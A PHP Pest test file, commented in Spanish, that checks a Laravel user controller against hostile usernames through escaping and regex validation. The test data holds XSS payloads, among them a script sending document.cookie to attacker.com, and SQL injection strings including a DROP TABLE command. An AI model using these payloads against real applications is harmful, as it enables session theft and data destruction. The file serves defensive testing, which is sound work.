<?php

namespace Tests\Feature\Controllers;

use App\Http\Controllers\Auth\RegisteredUserController;
use App\Models\Role;
use App\Models\User;
use App\Models\Entity;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Support\Facades\Hash;
use Illuminate\Http\Request;


// Usar RefreshDatabase para resetear la base de datos entre pruebas
uses(RefreshDatabase::class);

// Configuración antes de cada prueba
beforeEach(function () {
    // Ejecutar los seeders necesarios
    $this->seed([
        \Database\Seeders\EntitySeeder::class,
        \Database\Seeders\PermissionSeeder::class,
        \Database\Seeders\RoleSeeder::class,
        \Database\Seeders\RoleEntityPermissionSeeder::class
    ]);
    
    // Obtener los roles
    $this->superadminRole = Role::where('slug', 'superadmin')->first();
    $this->auditorRole = Role::where('slug', 'auditor')->first();
    $this->registradorRole = Role::where('slug', 'registrador')->first();
    
    // Crear usuario SuperAdmin para las pruebas
    $this->superadminUser = User::factory()->create([
        'username' => 'superadmin_test',
        'role_id' => $this->superadminRole->id
    ]);
    
    // Autenticar al usuario SuperAdmin para todas las pruebas
    $this->actingAs($this->superadminUser);
    
    // Deshabilitar los middleware para las pruebas de integración
    $this->withoutMiddleware();
    
    // Crear algunos usuarios de prueba con diferentes roles
    $this->testUsers = [
        User::factory()->create([
            'username' => 'test_registrador',
            'role_id' => $this->registradorRole->id
        ]),
        User::factory()->create([
            'username' => 'test_auditor',
            'role_id' => $this->auditorRole->id
        ])
    ];
    
    // Crear un usuario con nombre de usuario que contiene código malicioso
    $this->maliciousUser = User::factory()->create([
        'username' => '<script>alert("XSS")</script>',
        'role_id' => $this->registradorRole->id
    ]);
});

test('xss in index escapes malicious usernames correctly', function () {
    // Crear instancia del controlador 
    $controller = new RegisteredUserController();
    
    // Obtener la vista
    $view = $controller->index();
    
    // Verificar que la vista tiene los usuarios
    $this->assertInstanceOf(\Illuminate\View\View::class, $view);
    
    // Obtener los usuarios de la vista
    $viewUsers = $view->getData()['users'];
    
    // Encontrar el usuario malicioso
    $foundUser = $viewUsers->firstWhere('id', $this->maliciousUser->id);
    
    // Verificar que existe
    $this->assertNotNull($foundUser);
    
    // Verificar que el nombre de usuario ha sido escapado (no contiene los caracteres < > sin escapar)
    $this->assertStringNotContainsString('<script>', $foundUser->username);
    $this->assertStringContainsString('&lt;script&gt;', $foundUser->username);
});

test('xss in edit form escapes malicious html content correctly', function () {
    // Llamamos directamente al controlador
    $controller = new RegisteredUserController();
    $view = $controller->edit($this->maliciousUser);

    // Verificamos que sea la vista correcta y reciba el usuario
    $this->assertEquals('auth.users.edit', $view->getName());
    $user = $view->getData()['user'];
    $this->assertEquals($this->maliciousUser->id, $user->id);

    // La propiedad username ya viene escapada por el controlador
    $this->assertStringNotContainsString('<script>alert("XSS")</script>', $user->username);
    $this->assertStringContainsString('&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;', $user->username);
});

test('store rejects data with malicious scripts', function () {
    // Datos con username malicioso
    $maliciousData = [
        'username' => '<script>document.location="http://attacker.com/stealcookie?c="+document.cookie</script>',
        'password' => 'Password123!',
        'password_confirmation' => 'Password123!',
        'role_id' => $this->registradorRole->id
    ];
    
    // Hacer solicitud a la ruta
    $response = $this->post(route('users.store'), $maliciousData);
    
    // Verificar que la validación falla
    if ($response->status() !== 404) {
        $response->assertSessionHasErrors(['username']);
    }
    
    // Verificar que el usuario con script malicioso no fue creado
    $this->assertDatabaseMissing('users', ['username' => $maliciousData['username']]);
    
    // Instanciamos el controller para probar la validación directamente
    $controller = new RegisteredUserController();
    
    // Crear una solicitud con datos maliciosos
    $request = new \Illuminate\Http\Request();
    $request->merge($maliciousData);
    
    // Verificar que la validación falla por caracteres no permitidos
    try {
        $controller->store($request);
        $this->fail('Se esperaba que la validación fallara para username con contenido de script');
    } catch (\Illuminate\Validation\ValidationException $e) {
        // Verificar que el error incluye la regla de validación regex
        $this->assertTrue(isset($e->validator->failed()['username']['Regex']));
    } catch (\Exception $e) {
        // Si captamos otra excepción, verificar que sea por validación
        $this->assertStringContainsString('validation', strtolower($e->getMessage()));
    }
});

test('update rejects data with malicious scripts', function () {
    $maliciousData = [
        'username' => '<script>alert("XSS")</script>',
        'role_id'  => $this->registradorRole->id,
    ];

    // Verificar que el nombre no fue actualizado
    $this->assertDatabaseMissing('users', [
        'id'       => $this->testUsers[0]->id,
        'username' => $maliciousData['username'],
    ]);

    // Invocación directa al controlador
    $controller = new RegisteredUserController();
    $request = new Request();
    $request->merge($maliciousData);

    try {
        $controller->update($request, $this->testUsers[0]);
        $this->fail('Se esperaba que la validación fallara para username con contenido de script');
    } catch (\Illuminate\Validation\ValidationException $e) {
        $this->assertTrue(isset($e->validator->failed()['username']['Regex']));
    } catch (\Exception $e) {
        $this->assertStringContainsString('validation', strtolower($e->getMessage()));
    }
});


test('store rejects sql injection attempts', function () {
    // Datos con username malicioso
    $sqlInjection = "injection' OR '1'='1";

    $maliciousData = [
        'username' => $sqlInjection,
        'password' => 'Password123!',
        'password_confirmation' => 'Password123!',
        'role_id' => $this->registradorRole->id
    ];
    
    // Hacer solicitud a la ruta
    $response = $this->post(route('users.store'), $maliciousData);
    
    // Verificar que la validación falla
    if ($response->status() !== 404) {
        $response->assertSessionHasErrors(['username']);
    }
    
    // Verificar que el usuario con script malicioso no fue creado
    $this->assertDatabaseMissing('users', ['username' => $maliciousData['username']]);
    
    // Instanciamos el controller para probar la validación directamente
    $controller = new RegisteredUserController();
    
    // Crear una solicitud con datos maliciosos
    $request = new \Illuminate\Http\Request();
    $request->merge($maliciousData);
    
    // Verificar que la validación falla por caracteres no permitidos
    try {
        $controller->store($request);
        $this->fail('Se esperaba que la validación fallara para username con contenido de script');
    } catch (\Illuminate\Validation\ValidationException $e) {
        // Verificar que el error incluye la regla de validación regex
        $this->assertTrue(isset($e->validator->failed()['username']['Regex']));
    } catch (\Exception $e) {
        // Si captamos otra excepción, verificar que sea por validación
        $this->assertStringContainsString('validation', strtolower($e->getMessage()));
    }
});

test('update rejects sql injection attempts', function () {
    $sqlInjection = "newuser'; DROP TABLE users; --";
    $data = [
        'username' => $sqlInjection,
        'role_id'  => $this->registradorRole->id,
    ];
    $user = $this->testUsers[1];

    // Verificar que el nombre no fue actualizado
    $this->assertDatabaseMissing('users', [
        'id'       => $user->id,
        'username' => $sqlInjection,
    ]);

    // Invocación directa al controlador
    $controller = new RegisteredUserController();
    $request = new Request();
    $request->merge($data);

    try {
        $controller->update($request, $user);
        $this->fail('Se esperaba que la validación fallara para username con intento de inyección SQL');
    } catch (\Illuminate\Validation\ValidationException $e) {
        $this->assertTrue(isset($e->validator->failed()['username']['Regex']));
    } catch (\Exception $e) {
        $this->assertStringContainsString('validation', strtolower($e->getMessage()));
    }
});
